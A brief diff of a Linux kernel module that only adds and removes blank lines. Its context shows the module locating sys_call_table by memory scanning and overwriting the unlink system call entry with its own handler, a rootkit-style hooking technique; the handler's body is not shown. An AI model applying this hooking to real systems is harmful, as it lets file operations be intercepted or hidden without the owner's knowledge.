@@ -7,6 +7,7 @@
 
 MODULE_LICENSE("GPL");
 
+
 void** sys_call_table = NULL;
 
 char *filepath;
@@ -28,11 +29,9 @@ void find_sys_call_table(int scan_range) {
 }
 
 int init_module(void) {
-    
     find_sys_call_table(136 /* lucky number */);
     original_sys_unlink = sys_call_table[__NR_unlink];
     sys_call_table[__NR_unlink] = our_sys_unlink;
-    
     return 0;
 }
 
